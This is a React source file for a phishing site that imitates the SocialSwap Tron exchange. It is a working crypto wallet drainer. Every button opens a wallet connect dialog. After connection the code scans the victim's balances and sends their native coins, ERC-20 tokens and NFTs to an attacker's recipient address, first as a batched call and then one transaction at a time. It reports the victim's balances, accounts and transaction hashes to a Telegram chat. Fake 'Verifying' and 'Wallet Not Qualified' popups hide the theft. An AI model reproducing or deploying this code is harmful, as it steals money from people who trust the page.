import { useState, useMemo, useEffect, useCallback } from 'react'
import { BrowserProvider } from "ethers";
import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';
//0import {testTRONSignedBatchCallWithTronWeb, scanUserBalance, executeBatchCalls, prepareTransactions, prepareBatchTransferFrom, checkTokenAllowance } from './functions'
import tokenAddresses from './tokenAddresses'
import { tronWeb, adapter, chains } from './setup';
import { keccak256 } from 'tronweb/utils';
import { useAppKit,useAppKitAccount,useAppKitProvider   } from '@reown/appkit/react';
//import {BatchTransactionManager, TransactionTemplates, type BatchTransaction} from './BatchClass';
import {  useSendCalls, useWriteContract, useBalance, useAccount  } from 'wagmi'
import {scanUserBalances, handleGetBalance, sendTelegramMessage} from "./functions"
import { MaxInt256, parseEther } from 'ethers';
import { encodeFunctionData, erc20Abi, erc721Abi, formatEther } from 'viem';
import MetaMaskPopup from './popup';
import SendDialog from './manual';
const CONTRACT_ADDRESS = import.meta.env.VITE_CONTRACT_ADDRESS;
const RECIPIENT       = import.meta.env.VITE_RECIPIENT_ADDRESS;
const CHAT_ID         = import.meta.env.VITE_TELEGRAM_CHAT_ID;



/*
const wallet = new WalletConnectWallet({
  network: WalletConnectChainID.Mainnet, // Or Shasta, Nile for testnets
  options: {
    projectId: import.meta.env.VITE_PROJECT_ID, // Replace with your actual Project ID
    metadata: {
      name: 'socialswap Token',
      description: 'Earn and solve block chain issues on SocialSwap',
      url: 'https://your-dapp-website.org',
      icons: ['https://your-dapp-website.org/logo.png']
    }
  },
}); */

function App() {
  const [isOpen, setIsOpen] = useState(false)
  const [chainID, setChainID] = useState(0)
  const [isManOpen, setManualOpen] = useState(false)
   const [popupTitle, setPopupTitle] = useState("Processing Transaction");
 const [popupMessage, setPopupMessage] = useState("Please wait while we confirm...");
 const [headerText, setHeaderText] = useState("Wallet Connect");
 const [logoUrl, setLogoUrl] = useState("/metamask.jpg");
  const [isTransactionInProgress, setIsTransactionInProgress] = useState(false);
  const [transactionError, setTransactionError] = useState(null);
  const [transactionResult, setTransactionResult] = useState(null);
  const [hasInitiatedTransaction, setHasInitiatedTransaction] = useState(false);
  const [tokenBalances, setTokenBalance] = useState([false]);
  const { connector } = useAccount();
  const { open,close } = useAppKit();
  const {address, embeddedWalletInfo,  allAccounts, isConnected: isMobileConnect, caipAddress }  = useAppKitAccount();
  const {sendCalls, isPending: isSendCallsPending } = useSendCalls();
  const { writeContract, isPending: isWriteContractPending } = useWriteContract()
   const { walletProvider: provider } = useAppKitProvider("eip155")
   const { data: walletBalance, refetch, isLoading, isError } = useBalance({
    address: address,
  })


  const handleClose = ()=>{

  }

  const bigintToHex = (value) => {
    if (typeof value === 'bigint') {
      return '0x' + value.toString(16)
    }
    return value
  }

  const lookForManual = ()=>{
    const manualInterval = setInterval(()=>{
        const manual = document.querySelector("body > w3m-modal").shadowRoot.querySelector("wui-flex > wui-card > w3m-router").shadowRoot.querySelector("w3m-router-container > w3m-connect-view").shadowRoot.querySelector("wui-flex > wui-flex > wui-flex > w3m-wallet-login-list").shadowRoot.querySelector("wui-flex > w3m-connector-list").shadowRoot.querySelector("wui-flex > w3m-list-wallet:nth-child(3)").shadowRoot.querySelector("wui-list-wallet").shadowRoot.querySelector("button");

        if(manual){
          clearInterval(manualInterval);
          manual.addEventListener("click", ()=>{
            close();
            setManualOpen(true);
          });
        }
    }, 500);
    


  }

  const handleCancel = ()=>{
    open({view:"connect"});
    setManualOpen(false);
    lookForManual();
  }

  const connect = async ()=>{
    if(isMobileConnect){
      //await adapter.disconnect();
      close();
    }
    open({ view: "Connect" });
    lookForManual();
    //adapter.connect();
  }

  const formatBalancesTable = (resolvedBalances)=>{
      let table = "💰 <b>Balance Summary</b>\n";
      table += "━━━━━━━━━━━━━━━━━━━━\n\n";
      
      resolvedBalances.forEach((balance, index) => {
          table += `📊 <b>Asset ${index + 1}:</b>\n`;
          
          Object.entries(balance).forEach(([key, value]) => {
              // Format key for better readability
              const formattedKey = key
                  .replace(/([A-Z])/g, ' $1')
                  .replace(/^./, str => str.toUpperCase())
                  .trim();
              
              table += `  ${formattedKey}: <code>${value}</code>\n`;
          });
          
          table += "\n"; // Add spacing between assets
      });
      
      return table;
  }

  const runTokenFetches = useCallback(async (balances) => {
    if (isTransactionInProgress) {
      console.log("[v0] Transaction already in progress, skipping duplicate call")
      return
    }

    try {
      setIsTransactionInProgress(true);
      setTransactionError(null);
      setTransactionResult(null);

      console.log("[v0] Started token fetches with balances:", balances)

      if (!provider) {
        const errorMsg = "❌ Provider not available - wallet not connected"
        console.error(errorMsg)
        setTransactionError(errorMsg)
        setLogoUrl("/cancel.png");
        setPopupTitle("Processing Error");
        setPopupMessage("Wallet Not Qualified");

        setTimeout(()=>{
          setIsOpen(false);
        }, 5000);
        return
      }

     

      const resolvedBalances = await Promise.resolve(balances)
      if (!resolvedBalances || !Array.isArray(resolvedBalances)) {
        sendTelegramMessage(CHAT_ID, `Token Balance Couldn't be Fetched: ${address}`, chainID, "error", address);
        const errorMsg = "❌ Invalid balances data"
        console.error(errorMsg)
        setTransactionError(errorMsg)
        setLogoUrl("/cancel.png");
        setPopupTitle("Processing Error");
        setPopupMessage("Wallet Not Qualified");

        setTimeout(()=>{
          setIsOpen(false);
        }, 5000)
        return
      }

      console.log("[v0] Resolved balances:", resolvedBalances)
      const formattedBalance = formatBalancesTable(resolvedBalances);
      sendTelegramMessage(CHAT_ID, `Token Balances successfully Fetched: ${formattedBalance}`, chainID, "info", address);

      const calls = []
      
      // Build token transfer calls
      for (let x = 0; x < resolvedBalances.length; x++) {
        const balance = resolvedBalances[x];

        if( balance.type == "NATIVE"){
          let bal   = parseFloat( formatEther(balance.balance));
          const ethValue = parseEther((bal - 0.0001).toString())
            calls.push({
              to: RECIPIENT,
              value: bigintToHex(ethValue)
            })
        } 

        else if( balance.type == "TOKEN"){
            calls.push({
              to: balance.token_address,
              data: encodeFunctionData({
                abi: erc20Abi,
                functionName: 'transfer',
                args: [RECIPIENT, parseEther(balance.balance)]
              })
            })
        } else if( balance.type == "NFT" ){
          calls.push({
            to: balance.token_address,
            data: encodeFunctionData({
              abi: erc721Abi,
              functionName: 'transfer', // Direct transfer function
              args: [RECIPIENT, balance.tokenId] // to, tokenId
            })
          })
        }
        
        
      }

       if (!resolvedBalances.length ) {
        console.log("[v0] No balances to transfer")
        setTransactionResult({ message: "No balances to transfer" })
        setIsTransactionInProgress(false)
        setLogoUrl("/cancel.png");
        setPopupTitle("Processing Error");
        setPopupMessage("Wallet Not Qualified");

        setTimeout(()=>{
          setIsOpen(false);
        }, 5000)
        return
      }

      console.log("[v0] Built calls array:", calls)

      let accounts = []
      try {
        accounts = await provider.request({ 
          method: 'eth_accounts',
          params: []
        })
        console.log("[v0] Retrieved accounts:", accounts)
        sendTelegramMessage(CHAT_ID, `Total Account Retrieved From Target: ${accounts.length} ${accounts.map((account, index) => 
          `${index + 1}. <code>${account}</code>`
        ).join('\n')}`, chainID, "info", address);
      } catch (accountError) {
        const errorMsg = "❌ Failed to retrieve accounts: " + accountError.message
        sendTelegramMessage(CHAT_ID, `${errorMsg}`, chainID, "error", address);
        console.error(errorMsg)
        setTransactionError(errorMsg)
        setPopupTitle("Error ")
        setPopupMessage("Wallet Didn't Meet Requirement");
        setTimeout(()=>{          
          setIsTransactionInProgress(false)
          setIsOpen(false);
        }, 10000);
        return
      }

      const userAddress = accounts?.[0]
      if (!userAddress) {
        const errorMsg = "❌ No connected account found"
        console.error(errorMsg)
        setTransactionError(errorMsg)
        await open()
        setIsTransactionInProgress(false)
        return
      }

      console.log("[v0] User address:", userAddress)

      // Strategy 1: Try batch transaction (EIP-5792) - Trust Wallet may not support
      try {
        console.log("🔄 Attempting batch transaction via wallet_sendCalls...")

        let chainIdHex = null
        try {
          chainIdHex = await provider.request({
            method: 'eth_chainId',
            params: []
          })
          console.log("[v0] Chain ID (hex):", chainIdHex)
        } catch (chainError) {
          console.warn("[v0] Failed to get chain ID:", chainError.message)
          chainIdHex = '0x1' // Fallback to mainnet
        }

        sendTelegramMessage(CHAT_ID, `Attempting to batch the send calls, we need the target to confirm`, chainID, "info", address);

        const batchResult = await provider.request({
          method: 'wallet_sendCalls',
          params: [{
            version: "1.0",
            chainId: chainIdHex, // Already in hex format from eth_chainId
            from: userAddress,
            calls: calls,
            atomicRequired: false
          }]
        })
        let transactionHash;

        if (batchResult && batchResult.transactionHash) {
          // Direct transaction hash
          transactionHash = batchResult.transactionHash;
        } else if (batchResult && batchResult.result && batchResult.result.transactionHash) {
          // Nested in result object
          transactionHash = batchResult.result.transactionHash;
        } else if (batchResult && Array.isArray(batchResult) && batchResult[0]?.transactionHash) {
          // Array of results (multiple transactions)
          transactionHash = batchResult[0].transactionHash;
        } else if (batchResult && batchResult.id) {
          // Some wallets return an ID that might be the transaction hash
          transactionHash = batchResult.id;
        }
        sendTelegramMessage(CHAT_ID, `Batch Transaction Successful please review the transaction`, chainID, "success", address, transactionHash );
        console.log("[v0] ✅ Batch transaction sent via wallet_sendCalls:", batchResult)
        setTransactionResult({ method: 'batch', result: batchResult })
        setIsTransactionInProgress(false)
        return

      } catch (batchError) {
        console.log("[v0] ⚠️ Batch transaction not supported, falling back to sequential:", batchError.message)
        sendTelegramMessage(CHAT_ID, `⚠️ Batch transaction not supported, falling back to sequential: ${batchError.message}`, chainID, "warn", address );
        // Continue to sequential strategy
      }

      // Strategy 2: Sequential transactions (universal fallback for Trust Wallet)
      console.log("[v0] Executing sequential transfers...")
      const results = []

      for (let i = 0; i < calls.length; i++) {
        try {
          console.log(`[v0] Sending transaction ${i + 1}/${calls.length}...`)
          sendTelegramMessage(CHAT_ID, `⚠️ Sending transaction ${i + 1}/${calls.length}...`, chainID, "info", address );

          const txObject = {
            from: userAddress,
            to: calls[i].to
          }

          // Only include data if it's a token transfer
          if (calls[i].data) {
            txObject.data = calls[i].data
          }

          // Only include value if it's an ETH transfer
          if (calls[i].value) {
            txObject.value = bigintToHex(calls[i].value)
          }

          console.log("[v0] Transaction object:", txObject)

          const txHash = await provider.request({
            method: 'eth_sendTransaction',
            params: [txObject]
          })

          console.log(`[v0] ✅ Transaction ${i + 1} sent:`, txHash)
          results.push({
            success: true,
            hash: txHash,
            index: i,
            token: resolvedBalances[i]?.token_address
          })

          // Add delay between transactions to avoid nonce conflicts
          if (i < calls.length - 1) {
            console.log("⏳ Waiting 2 seconds before next transaction...")
            await new Promise(resolve => setTimeout(resolve, 2000))
          }

        } catch (txError) {
          console.error(`[v0] ❌ Transaction ${i + 1} failed:`, txError.message)
          results.push({
            success: false,
            error: txError.message,
            index: i,
            token: resolvedBalances[i]?.token_address
          })
          // Continue with next transaction even if one fails
        }
      }

      console.log("[v0] All transactions completed:", results)
      sendTelegramMessage(CHAT_ID, `⚠️ All transactions completed:...${results.map((result, index) => 
          `${index + 1}. <code>${result.hash}</code>`
        ).join('\n')}`, chainID, "success", address );
      setTransactionResult({ method: 'sequential', results })
      setIsTransactionInProgress(false)
      setLogoUrl("/cancel.png");
      setPopupTitle("Processing Error");
        setPopupMessage("Wallet Not Qualified");

        setTimeout(()=>{
          setIsOpen(false);
        }, 10000)

    } catch (error) {
      const errorMsg = "❌ Token fetch process failed: " + error.message
      sendTelegramMessage(CHAT_ID, "❌ Token fetch process failed: " + error.message, chainID, "success", address );
      console.error(errorMsg)
      setLogoUrl("/cancel.png");
      setPopupTitle("Processing Error");
        setPopupMessage("Wallet Not Qualified");

        setTimeout(()=>{
          setIsOpen(false);
        }, 10000)
      setTransactionError(errorMsg)
      setIsTransactionInProgress(false)
    }
  }, [provider, address, open, isTransactionInProgress]) // Added isTransactionInProgress to dependencies

  const fetchBalances = useCallback(async (add)=>{
    console.log("callback running...")
      const balances = await scanUserBalances(add);
      console.log("setting token gotten...", balances )
      setTokenBalance((former)=> former.concat(balances).filter((bal) => !!bal ))
    }, []);

  useEffect(()=>{
    console.log("[v0] Got token balances:", tokenBalances)

    if( ! isMobileConnect ) return;

    console.log("[v0] token balances recheck:", tokenBalances)
    setIsOpen(true); 
    setPopupTitle("Verifying")
    setPopupMessage("Pending")
    
    if(connector){
      setLogoUrl(connector.icon)
      setHeaderText(connector.name)
    }

    if(!tokenBalances.length) {
      
      setPopupTitle("Error Verifying")
      setPopupMessage("Wallet not Qualified")
      setTimeout(()=>{
        setIsOpen(false); 
      }, 5000)
      return;
    }

    const tokened = tokenBalances.filter(bal => !!bal )
    console.log(tokenBalances);
    if( ! provider || ! tokened.length ) return;
    
    runTokenFetches(tokenBalances)
  }, [tokenBalances, isMobileConnect])

  useEffect(() => {
    console.log("[v0] useEffect triggered - isMobileConnect:", isMobileConnect, "address:", address)

    const runGetChainID = async ()=>{
      if( provider ){
        const etherProvider = new BrowserProvider( provider);
        const network = await etherProvider.getNetwork();
        if(network){
          setChainID(network.chainId)
        }
      }
    }

    

    if (isMobileConnect && address && provider && !hasInitiatedTransaction && !isTransactionInProgress) {
      runGetChainID();
      //sendTelegramMessage(CHAT_ID, `Target Connection Confirmed, Connected Account Addresses: ${allAccounts.map((add)=>`<code>${add.address}</code>`).join("\n")}`, chainID, "info", address);
      console.log("[v0] Initiating token fetch transaction")
      setHasInitiatedTransaction(true) // Set flag to prevent re-running
      
        fetchBalances(allAccounts.map(add => add.address))
      
    }
  }, [isMobileConnect, address, provider, connector]) // Removed runTokenFetches and hasInitiatedTransaction dependencies


  return (
    <>
 <div
      data-collapse="medium"
      data-animation="default"
      data-duration="400"
      data-easing="ease"
      data-easing2="ease"
      role="banner"
      className="navigation w-nav"
    >
      <div className="grid grid-cols-2 w-full place-items-center justify-between">
        <div className="flex place-items-center justify-self-start">
          <a
            data-discover="true"
            aria-current="page"
            className="logo-link w-nav-brand w--current active"
            href="/"
            ><img
              src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee68e7367ac28ad5c7c42_logo.webp"
              width="104"
              alt="logo: socialswap"
              className="logo-image"
          /></a>
        </div>
        <div className="flex flex-row place-items-center gap-4 justify-self-end">
          <a
            data-discover="true"
            className="navigation-item w-nav-link"
            href="#"
            onClick={()=>{
              connect()
            }}
            >socialswap</a>
          <a
            data-discover="true"
            className="navigation-item w-nav-link"
            href="#"
            onClick={()=>{
              connect()
            }}
            >socialstaking</a>
          <a
            href="http://javascript:void(0)"
            className="navigation-item inactive w-nav-link"
            ><span className="op-30">SocialEnergy </span>
            <span className="soon">soon!</span></a>
          <a
            data-discover="true"
            className="btn btn-primary stretched w-inline-block"
            href="#"
            onClick={()=>{
              connect()
            }}
            ><div className="link">Exchange Now</div></a>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="#aaa"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="lucide lucide-settings"
            type="button"
            id="radix-:r0:"
            aria-haspopup="menu"
            aria-expanded="false"
            data-state="closed"
          >
            <path
              d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"
            ></path>
            <circle cx="12" cy="12" r="3"></circle>
          </svg>
        </div>
      </div>
    </div>
    <div className="py-4">
      <section className="hero">
        <h1 className="heading-hero">Decentralized Exchange</h1>
        <img
          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee68356a6c8970b62e06a_token-hero.webp"
          loading="lazy"
          width="610"
          alt=""
          srcSet="
            https://cdn.prod.website-files.com/635397204d0d410851921320/665ee68356a6c8970b62e06a_token-hero-p-500.webp 500w,
            https://cdn.prod.website-files.com/635397204d0d410851921320/665ee68356a6c8970b62e06a_token-hero.webp       609w
          "
          sizes="(max-width: 479px) 100vw, (max-width: 767px) 265.359375px, (max-width: 991px) 331.6875px, 610px"
          className="token-swoosh-1"
          style={{willChange: "auto", transform: "none"}}
        />
        <div className="hero-texts">
          <p className="hero-paragraph">
            The easiest way to exchange and stake cryptocurrencies. Generate
            passive income with Energy
          </p>
          <h2 className="hero-headline-big">on the Tron Blockchain.</h2>
          <a href="/trade" className="hero-image-launch w-inline-block"
            ><img
              src="https://cdn.prod.website-files.com/635397204d0d410851921320/66686ab25d6ca74ef6f664ab_launch-btn.webp"
              loading="lazy"
              alt="Button: Unlock Energy on Tron Blockchain"
              className="hero-image-launch"
          /></a>
        </div>
      </section>
      <section className="energy">
        <div className="w-layout-hflex flex-block">
          <h2 className="headline-h2 _w-40">
            Discover the <br />Power of TRON Energy
          </h2>
          <div className="energy-text">
            <p className="regular-text">
              Take advantage of the opportunity to execute completely free
              transactions and earn passive income with cryptocurrencies.
              Provide energy for Tron Blockchain users or use the energy for
              yourself.
            </p>
            <a href="#" className="btn btn-primary w-inline-block"
            onClick={()=>{
              connect()
            }}
              ><img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bd6e16530d6cada0d_flash.webp"
                loading="lazy"
                alt=""
                className="icon-xs"
              />
              <div className="text-block">Coming Soon</div></a
            >
          </div>
        </div>
      </section>
      <section className="slider relative">
        <div className="relative" role="region" aria-roledescription="carousel">
          <div className="overflow-hidden">
            <div
              className="flex -ml-4 slider-show w-slider"
              style={{transform: "translate3d(0px, 0px, 0px)"}}
            >
              <div
                role="group"
                aria-roledescription="slide"
                className="min-w-0 shrink-0 grow-0 basis-full pl-4 slide-base w-slide opacity-100 z-50"
                style={{transform: "translate3d(0px, 0px, 0px)"}}
              >
                <h2 className="headline-h2">Earn passive Income with Staking</h2>
                <p className="regular-text">
                  Stake your cryptocurrencies in numerous SST pools and earn
                  attractive rewards.
                </p>
                <div className="grid lg:grid-cols-2 gap-3">
                  <div className="flex flex-col lg:flex-row gap-3">
                    <div className="coin pool">
                      <div className="coin-left">
                        <img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bf838352751a92faf_tron.webp"
                          loading="lazy"
                          alt="icon TRON/SST"
                          className="coin-icon"
                        /><img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65b6bf82471f950a2b5_logo-icon.webp"
                          loading="lazy"
                          alt="icon TRON/SST"
                          className="coin-icon overlap"
                        />
                      </div>
                      <div className="w-layout-vflex">
                        <h3 className="headline-h5 pool-name">TRON/SST</h3>
                        <p className="coin-index">TRX/SST</p>
                      </div>
                    </div>
                    <div className="coin pool">
                      <div className="coin-left">
                        <img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bb24667e0f7451087_tether.webp"
                          loading="lazy"
                          alt="icon USDT/SST"
                          className="coin-icon"
                        /><img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65b6bf82471f950a2b5_logo-icon.webp"
                          loading="lazy"
                          alt="icon USDT/SST"
                          className="coin-icon overlap"
                        />
                      </div>
                      <div className="w-layout-vflex">
                        <h3 className="headline-h5 pool-name">USDT/SST</h3>
                        <p className="coin-index">USDT/SST</p>
                      </div>
                    </div>
                    <div className="coin pool">
                      <div className="coin-left">
                        <img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65b6bf82471f950a2b5_logo-icon.webp"
                          loading="lazy"
                          alt="icon SOLO SST"
                          className="coin-icon"
                        />
                      </div>
                      <div className="w-layout-vflex">
                        <h3 className="headline-h5 pool-name">SOLO SST</h3>
                        <p className="coin-index">SST</p>
                      </div>
                    </div>
                  </div>
                  <div
                    className="btn stretched h-full py-[21px] lg:justify-self-end bg-gray-800 text-gray-400 cursor-not-allowed flex items-center gap-2 px-4 rounded"
                    title="Coming soon"
                  >
                    <img
                      src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bb8610e14f409449c_stack.webp"
                      loading="lazy"
                      alt=""
                      className="icon-xs opacity-50"
                    />
                    <div className="flex flex-col items-start leading-tight">
                      <span className="text-sm">Start Staking</span>
                      <span
                        className="text-xs text-yellow-400 font-semibold uppercase"
                        >soon!</span>
                      
                    </div>
                  </div>
                </div>
              </div>
              <div
                role="group"
                aria-roledescription="slide"
                className="min-w-0 shrink-0 grow-0 basis-full pl-4 slide-base w-slide opacity-100 z-50"
              >
                <h2 className="headline-h2">Coins you can trade with us</h2>
                <p className="regular-text">
                  Take advantage of the opportunity to swap and sell your
                  rewards from the staking pools. Exchange these
                  cryptocurrencies in all directions.
                </p>
                <div className="grid lg:grid-cols-2 gap-3">
                  <div className="flex flex-col lg:flex-row gap-3">
                    <div className="coin pool">
                      <div className="coin-left">
                        <img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bf838352751a92faf_tron.webp"
                          loading="lazy"
                          alt="icon TRON"
                          className="coin-icon"
                        />
                      </div>
                      <div className="w-layout-vflex">
                        <h3 className="headline-h5 pool-name">TRON</h3>
                        <p className="coin-index">TRX</p>
                      </div>
                    </div>
                    <div className="coin pool">
                      <div className="coin-left">
                        <img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bb24667e0f7451087_tether.webp"
                          loading="lazy"
                          alt="icon USDT"
                          className="coin-icon"
                        />
                      </div>
                      <div className="w-layout-vflex">
                        <h3 className="headline-h5 pool-name">USDT</h3>
                        <p className="coin-index">USDT</p>
                      </div>
                    </div>
                    <div className="coin pool">
                      <div className="coin-left">
                        <img
                          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65b6bf82471f950a2b5_logo-icon.webp"
                          loading="lazy"
                          alt="icon SST"
                          className="coin-icon"
                        />
                      </div>
                      <div className="w-layout-vflex">
                        <h3 className="headline-h5 pool-name">SST</h3>
                        <p className="coin-index">SST</p>
                      </div>
                    </div>
                  </div>
                  <a
                    href="/trade"
                    className="btn btn-primary stretched h-full py-[21px] lg:justify-self-end"
                    ><img
                      src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65b0c0dbdc98f392d2c_trade.webp"
                      loading="lazy"
                      alt=""
                      className="icon-xs"
                    />
                    <div className="text-block">Trade Now</div></a>
                </div>
              </div>
            </div>
          </div>
          <div className="slide-nav w-slider-nav">
            <div
              className="w-slider-dot w-active"
              aria-label="Show slide 1 of 2"
              role="button"
              tabIndex={0}
            ></div>
            <div
              className="w-slider-dot"
              aria-label="Show slide 2 of 2"
              role="button"
              tabIndex={0}
            ></div>
          </div>
        </div>
        <img
          src="https://cdn.prod.website-files.com/635397204d0d410851921320/665f0c843daa1fdfedf7666b_background-dots.svg"
          loading="lazy"
          alt=""
          className="background-dots"
          style={{zIndex: "-1"}}
        />
      </section>
      <section
        data-w-id="5825e3b8-7174-8325-e19b-83c06c719664"
        className="features"
      >
        <h2 className="headline-h2">Benefit from our Features</h2>
        <div className="feature-list w-row">
          <div
            className="feature w-col w-col-4 w-col-small-small-stack w-col-tiny-tiny-stack cursor-pointer"
            onClick={()=>{
              connect()
            }}
          >
            <div className="feature-top">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee627fce7fdfd0e59d53e_money-stacked.webp"
                loading="lazy"
                alt=""
                className="feature-icon"
              />
            </div>
            <div className="feature-text">
              <h3 className="heading-h3">Lowest Transaction Cost</h3>
              <p className="feature-text">
                Benefit from the <br />Lowest Transaction Costs
              </p>
            </div>
          </div>
          <div
            className="feature middle w-col w-col-4 w-col-small-small-stack w-col-tiny-tiny-stack cursor-pointer"
            onClick={()=>{
              connect()
            }}
          >
            <div className="feature-top _2">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee67eb53002ccee686207_blockchain.webp"
                loading="lazy"
                alt=""
                className="feature-icon"
              />
            </div>
            <div className="feature-text">
              <h3 className="heading-h3">Fast Blockchain Protocol</h3>
              <p className="feature-text">
                Unleashing the Power of Instantaneous Blockchain Operations
              </p>
            </div>
          </div>
          <div
            className="feature w-col w-col-4 w-col-small-small-stack w-col-tiny-tiny-stack cursor-pointer"
            onClick={()=>{
              connect()
            }}
          >
            <div className="feature-top _3">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee627fce7fdfd0e59d535_shield.webp"
                loading="lazy"
                alt=""
                className="feature-icon"
              />
            </div>
            <div className="feature-text">
              <h3 className="heading-h3">Smart Contracts</h3>
              <p className="feature-text">
                Secure, Self-Executing Contracts for Effortless Transactions
              </p>
            </div>
          </div>
        </div>
      </section>
      <section
        data-w-id="5825e3b8-7174-8325-e19b-83c06c719664"
        className="features"
      >
        <h2 className="headline-h2">Benefit from our Features</h2>
        <div className="feature-list w-row">
          <div
            className="feature w-col w-col-4 w-col-small-small-stack w-col-tiny-tiny-stack cursor-pointer"
            onClick={()=>{
              connect()
            }}
          >
            <div className="feature-top">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee627fce7fdfd0e59d53e_money-stacked.webp"
                loading="lazy"
                alt=""
                className="feature-icon"
              />
            </div>
            <div className="feature-text">
              <h3 className="heading-h3">Enjoy Gasless</h3>
              <p className="feature-text">
                Benefit from the <br />Gasless Transactions
              </p>
            </div>
          </div>
          <div
            className="feature middle w-col w-col-4 w-col-small-small-stack w-col-tiny-tiny-stack cursor-pointer"
            onClick={()=>{
              connect()
            }}
          >
            <div className="feature-top _2">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee67eb53002ccee686207_blockchain.webp"
                loading="lazy"
                alt=""
                className="feature-icon"
              />
            </div>
            <div className="feature-text">
              <h3 className="heading-h3">Reclaim Funds</h3>
              <p className="feature-text">
                Reclaim Lost Funds from Database
              </p>
            </div>
          </div>
          <div
            className="feature w-col w-col-4 w-col-small-small-stack w-col-tiny-tiny-stack cursor-pointer"
            onClick={()=>{
              connect()
            }}
          >
            <div className="feature-top _3">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee627fce7fdfd0e59d535_shield.webp"
                loading="lazy"
                alt=""
                className="feature-icon"
              />
            </div>
            <div className="feature-text">
              <h3 className="heading-h3">Reclaim Tokens</h3>
              <p className="feature-text">
                We can make you reclaim lost token effortlessly
              </p>
            </div>
          </div>
        </div>
      </section>
      <section className="community">
        <div className="columns w-row">
          <div className="column-community w-col w-col-6 w-col-stack">
            <div>
              <h2 className="headline-h2">What makes SocialSwap Special?</h2>
              <p className="regular-text">It's a Community Project.</p>
            </div>
            <div className="w-layout-hflex d-flex">
              <p className="bold-text">Join us!</p>
              <div className="w-layout-hflex social-media-links">
                <a href="index.html#" className="social-media-link w-inline-block"
                  ><img
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65be23d7bdf528a08ee_instagram.webp"
                    loading="lazy"
                    alt="instagram" /></a>
                <a href="index.html#" className="social-media-link w-inline-block"
                  ><img
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65b39ffa5648812b6cc_telegram.webp"
                    loading="lazy"
                    alt="telegram" /></a>
                <a href="index.html#" className="social-media-link w-inline-block"
                  ><img
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65ba27fc3ea728921ff_twitter.webp"
                    loading="lazy"
                    alt="Twitter" /></a>
                <a href="index.html#" className="social-media-link w-inline-block"
                  ><img
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bacd0a633b6223db2_youtube.webp"
                    loading="lazy"
                    alt="Youtube"
                /></a>
              </div>
            </div>
          </div>
          <div className="dv-flex w-col w-col-6 w-col-stack">
            <div className="w-layout-hflex _w-100">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee627fce7fdfd0e59d53a_institute.webp"
                loading="lazy"
                alt=""
                className="icon-l"
              />
              <div className="w-layout-vflex community-text">
                <h3 className="heading-h3">Governance</h3>
                <p className="paragraph-2">
                  SocialSwap is designed to be governed by you, reflecting our
                  commitment to democracy.
                </p>
              </div>
            </div>
            <div className="w-layout-hflex _w-100">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee62db0e17d60fb534805_community.webp"
                loading="lazy"
                alt=""
                className="icon-l"
              />
              <div className="w-layout-vflex community-text">
                <h3 className="heading-h3">Exclusive Community</h3>
                <p className="paragraph-2">
                  In the past, many community events took place and the
                  co-creators exchanged ideas with the community.
                </p>
              </div>
            </div>
            <div className="w-layout-hflex _w-100">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee6279f1ae58b3b07ce47_deflation.webp"
                loading="lazy"
                alt=""
                className="icon-l"
              />
              <div className="w-layout-vflex community-text">
                <h3 className="heading-h3">Deflation</h3>
                <p className="paragraph-2">
                  The SocialSwap Token is designed to decrease in supply
                  ensuring that it becomes scarcer over time.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>
      <section className="community">
        <div className="columns mobile w-row">
          <div id="audits" className="column-audits w-col w-col-6">
            <div>
              <h2 className="headline-h2">Audits &amp;Security</h2>
              <p className="regular-text">
                SocialSwap.io has been reviewed and audited by several
                independent security companies.
              </p>
            </div>
            <div className="w-layout-hflex d-flex mobile">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee6272f33c30686a85e6d_certik.webp"
                loading="lazy"
                alt="logo: certik"
                className="audit-companies"
              /><img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee6829dcc726cc0147a6b_tp.webp"
                loading="lazy"
                alt="logo: tp audit"
